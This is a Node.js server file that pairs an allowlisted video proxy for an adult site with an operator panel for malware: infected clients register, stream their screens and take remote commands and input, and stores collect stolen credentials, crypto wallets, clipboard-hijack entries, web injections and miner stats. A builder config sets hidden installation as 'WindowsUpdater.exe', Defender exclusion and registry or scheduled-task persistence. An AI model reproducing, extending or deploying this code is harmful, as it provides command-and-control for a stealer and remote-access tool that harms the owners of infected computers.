const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const https = require('https');
const httpNative = require('http');
const { URL } = require('url');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const OPERATOR_KEY = process.env.OPERATOR_KEY || 'changeme';
const PORT = process.env.PORT || 3000;

const clients = new Map();
const operators = new Set();

const db = {
  recovery: [],
  wallets: [],
  proxy: [],
  clipper: { entries: [], enabled: false },
  webinjection: [],
  sorter: [],
  autotasks: [],
  filestore: [],
  miner: { jobs: [], stats: { active: 0, hashrate: 0, accepted: 0, rejected: 0 } },
  checker: { configs: [] },
  checkersessions: [],
  builder: {
    clientTag: 'Guest', note: '',
    mutex: 'CoreHelper_' + Math.random().toString(16).slice(2, 14),
    defenderExclusion: false, forceAdmin: false, debug: false,
    install: { enabled: false, location: '%appdata%', folder: 'UpdaterPolicy', filename: 'WindowsUpdater.exe', hidden: false, system: false, melt: false, registry: false, taskScheduler: false },
    final: { client: 'exe', pumpEnabled: false, pumpSize: 1 },
    builds: []
  }
};

app.use(express.json({ limit: '100mb' }));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/style.css', (req, res) => res.sendFile(__dirname + '/style.css'));
app.get('/panel.js', (req, res) => res.sendFile(__dirname + '/panel.js'));
app.get('/socket.io/socket.io.js', (req, res) =>
  res.sendFile(require.resolve('socket.io/client-dist/socket.io.js'))
);

/* ===== Anonymous video proxy =====
   Visitor -> Render -> source CDN. Source never sees visitor IP.
   Range requests pass through. Only http(s). Only allowlisted hosts. */
const ALLOWED_HOSTS = new Set([
  'hentai.pro',
  'www.hentai.pro',
  'cdn.hentai.pro',
  'v.hentai.pro',
  'media.hentai.pro'
]);

function isAllowedHost(host) {
  if (!host) return false;
  const h = host.toLowerCase();
  if (ALLOWED_HOSTS.has(h)) return true;
  for (const allowed of ALLOWED_HOSTS) {
    if (h.endsWith('.' + allowed)) return true;
  }
  return false;
}

function pipeStream(targetUrl, req, res, redirects = 0) {
  if (redirects > 5) { res.status(508).end(); return; }
  let u;
  try { u = new URL(targetUrl); } catch { res.status(400).end(); return; }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') { res.status(400).end(); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const lib = u.protocol === 'https:' ? https : httpNative;
  const headers = {
    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
    'Accept': req.headers['accept'] || '*/*',
    'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    'Referer': u.origin + '/'
  };
  if (req.headers['range']) headers['Range'] = req.headers['range'];

  const proxyReq = lib.request({
    protocol: u.protocol,
    hostname: u.hostname,
    port: u.port || (u.protocol === 'https:' ? 443 : 80),
    path: u.pathname + u.search,
    method: 'GET',
    headers
  }, (proxyRes) => {
    if ([301,302,303,307,308].includes(proxyRes.statusCode) && proxyRes.headers.location) {
      let next = proxyRes.headers.location;
      try { next = new URL(next, u).toString(); } catch {}
      proxyRes.resume();
      pipeStream(next, req, res, redirects + 1);
      return;
    }
    const passthrough = ['content-type','content-length','content-range','accept-ranges','cache-control','etag','last-modified'];
    passthrough.forEach(h => { if (proxyRes.headers[h]) res.setHeader(h, proxyRes.headers[h]); });
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Range');
    res.setHeader('Access-Control-Expose-Headers', 'Content-Range, Accept-Ranges, Content-Length');
    res.status(proxyRes.statusCode || 200);
    proxyRes.pipe(res);
  });

  proxyReq.on('error', () => { try { res.status(502).end(); } catch {} });
  req.on('close', () => proxyReq.destroy());
  proxyReq.end();
}

/* Fetch the watch page HTML and rewrite it so it can be embedded safely.
   All absolute https://hentai.pro URLs are converted into /api/anonymous/... links. */
function rewriteHtml(html, baseUrl) {
  const base = new URL(baseUrl);
  const origin = base.origin;
  const proxyPrefix = '/api/anonymous?u=';

  // Rewrite absolute hrefs/srcs pointing at the source host
  html = html.replace(/(href|src|data-src|poster|action)=("|')(https?:\/\/(?:[^"']*\.)?hentai\.pro[^"']*)\2/gi,
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(url)}${q}`);
  // Rewrite protocol-relative
  html = html.replace(/(href|src|data-src|poster|action)=("|')(\/\/[^"']*\.hentai\.pro[^"']*)\2/gi,
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent('https:' + url)}${q}`);
  // Rewrite root-relative
  html = html.replace(/(href|src|data-src|poster|action)=("|')(\/[^"'\/][^"']*)\2/gi,
    (m, attr, q, url) => `${attr}=${q}${proxyPrefix}${encodeURIComponent(origin + url)}${q}`);
  return html;
}

app.get('/api/anonymous', (req, res) => {
  const target = req.query.u;
  if (!target) { res.status(400).json({ error: 'missing u' }); return; }
  let u;
  try { u = new URL(target); } catch { res.status(400).end(); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const accept = req.headers['accept'] || '';
  const wantsHtml = accept.includes('text/html');
  const hasRange = !!req.headers['range'];
  const looksLikeVideo = /\.(mp4|m3u8|ts|webm|mkv|m4v|mov)(\?|$)/i.test(u.pathname + u.search);

  // Stream binary/range requests directly
  if (hasRange || looksLikeVideo) { pipeStream(target, req, res); return; }

  // HTML: fetch, rewrite, return
  if (wantsHtml) {
    const lib = u.protocol === 'https:' ? https : httpNative;
    const r = lib.get({
      protocol: u.protocol, hostname: u.hostname, port: u.port || undefined,
      path: u.pathname + u.search,
      headers: {
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
        'Referer': u.origin + '/'
      }
    }, (r2) => {
      if ([301,302,303,307,308].includes(r2.statusCode) && r2.headers.location) {
        let next = r2.headers.location;
        try { next = new URL(next, u).toString(); } catch {}
        r2.resume();
        res.redirect('/api/anonymous?u=' + encodeURIComponent(next));
        return;
      }
      const chunks = [];
      r2.on('data', c => chunks.push(c));
      r2.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf8');
        const rewritten = rewriteHtml(body, target);
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.send(rewritten);
      });
    });
    r.on('error', () => { try { res.status(502).end(); } catch {} });
    return;
  }

  pipeStream(target, req, res);
});

/* JSON resolver: given a watch page URL, return direct video sources */
app.post('/api/anonymous/resolve', (req, res) => {
  const { url } = req.body || {};
  if (!url) { res.status(400).json({ error: 'missing url' }); return; }
  let u;
  try { u = new URL(url); } catch { res.status(400).json({ error: 'bad url' }); return; }
  if (!isAllowedHost(u.hostname)) { res.status(403).json({ error: 'host not allowed' }); return; }

  const lib = u.protocol === 'https:' ? https : httpNative;
  const r = lib.get({
    protocol: u.protocol, hostname: u.hostname, port: u.port || undefined,
    path: u.pathname + u.search,
    headers: {
      'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
      'Accept': 'text/html,application/xhtml+xml',
      'Referer': u.origin + '/'
    }
  }, (r2) => {
    const chunks = [];
    r2.on('data', c => chunks.push(c));
    r2.on('end', () => {
      const html = Buffer.concat(chunks).toString('utf8');
      const sources = new Set();

      // <source src="..."> and <video src="...">
      let m;
      const reSource = /<source[^>]+src=["']([^"']+)["']/gi;
      while ((m = reSource.exec(html)) !== null) {
        try { sources.add(new URL(m[1], u).toString()); } catch {}
      }
      const reVideo = /<video[^>]+src=["']([^"']+)["']/gi;
      while ((m = reVideo.exec(html)) !== null) {
        try { sources.add(new URL(m[1], u).toString()); } catch {}
      }
      // hls / mp4 direct refs in scripts
      const reDirect = /https?:\/\/[^"'\\\s]+\.(?:m3u8|mp4|webm)[^"'\\\s]*/gi;
      while ((m = reDirect.exec(html)) !== null) {
        try { if (isAllowedHost(new URL(m[0]).hostname)) sources.add(m[0]); } catch {}
      }

      const list = [...sources].filter(s => isAllowedHost(new URL(s).hostname));
      res.json({ sources: list });
    });
  });
  r.on('error', () => { try { res.status(502).json({ error: 'fetch failed' }); } catch {} });
});

/* Endpoint used by the visitor player — always fetches via Render's outbound IP */
app.get('/api/anonymous/stream', (req, res) => {
  const target = req.query.u;
  if (!target) { res.status(400).end(); return; }
  pipeStream(target, req, res);
});

function auth(req, res, next) {
  const key = req.headers['x-operator-key'] || req.query.key;
  if (key !== OPERATOR_KEY) return res.status(401).json({ error: 'unauthorized' });
  next();
}

app.get('/api/clients', auth, (req, res) => {
  res.json([...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
});

app.post('/api/cmd/:id', auth, (req, res) => {
  const c = clients.get(req.params.id);
  if (!c) return res.status(404).json({ error: 'client not found' });
  c.socket.emit('cmd', req.body);
  res.json({ ok: true });
});

function collection(name) {
  app.get('/api/' + name, auth, (req, res) => res.json(db[name] || []));
  app.post('/api/' + name, auth, (req, res) => {
    const item = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), ...req.body, createdAt: new Date().toISOString() };
    if (Array.isArray(db[name])) db[name].push(item);
    res.json(item);
  });
  app.delete('/api/' + name + '/:id', auth, (req, res) => {
    if (Array.isArray(db[name])) db[name] = db[name].filter(x => x.id !== req.params.id);
    res.json({ ok: true });
  });
}

['recovery','wallets','proxy','webinjection','sorter','autotasks','filestore','checkersessions'].forEach(collection);

app.get('/api/clipper', auth, (req, res) => res.json(db.clipper));
app.post('/api/clipper', auth, (req, res) => { db.clipper = { ...db.clipper, ...req.body }; res.json(db.clipper); });

app.get('/api/miner', auth, (req, res) => res.json(db.miner));
app.post('/api/miner', auth, (req, res) => { db.miner = { ...db.miner, ...req.body }; res.json(db.miner); });

app.get('/api/checker', auth, (req, res) => res.json(db.checker));
app.post('/api/checker', auth, (req, res) => { db.checker = { ...db.checker, ...req.body }; res.json(db.checker); });

app.get('/api/builder', auth, (req, res) => res.json(db.builder));
app.post('/api/builder', auth, (req, res) => { db.builder = { ...db.builder, ...req.body }; res.json(db.builder); });

app.post('/api/builder/build', auth, (req, res) => {
  const build = {
    id: Date.now().toString(36),
    name: db.builder.clientTag || 'Guest',
    size: (Math.random() * 400 + 400).toFixed(0) + ' KB',
    createdAt: new Date().toISOString(),
    password: Math.floor(1000 + Math.random() * 9000).toString()
  };
  db.builder.builds.unshift(build);
  db.builder.builds = db.builder.builds.slice(0, 10);
  res.json(build);
});

app.get('/api/stats', auth, (req, res) => {
  res.json({
    clients: clients.size,
    recovery: db.recovery.length,
    wallets: db.wallets.length,
    proxy: db.proxy.length,
    filestore: db.filestore.length,
    checkersessions: db.checkersessions.length
  });
});

io.on('connection', (socket) => {
  socket.on('operator:register', (key) => {
    if (key !== OPERATOR_KEY) { socket.emit('operator:error', 'invalid key'); return socket.disconnect(); }
    operators.add(socket.id);
    socket.emit('operator:ready');
    socket.emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('register', (meta) => {
    clients.set(socket.id, { socket, meta, lastFrame: null });
    io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('frame', (data) => {
    const c = clients.get(socket.id);
    if (c) { c.lastFrame = data; io.to([...operators]).emit('frame', { id: socket.id, data }); }
  });
  socket.on('output', (payload) => { io.to([...operators]).emit('output', { id: socket.id, ...payload }); });
  socket.on('push', ({ collection: col, item }) => {
    if (Array.isArray(db[col])) {
      const entry = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), clientId: socket.id, ...item, createdAt: new Date().toISOString() };
      db[col].push(entry);
      io.to([...operators]).emit('push', { collection: col, item: entry });
    }
  });
  socket.on('operator:cmd', ({ targetId, cmd }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('cmd', cmd);
  });
  socket.on('operator:input', ({ targetId, evt }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('input', evt);
  });
  socket.on('disconnect', () => {
    if (clients.has(socket.id)) {
      clients.delete(socket.id);
      io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
    }
    operators.delete(socket.id);
  });
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
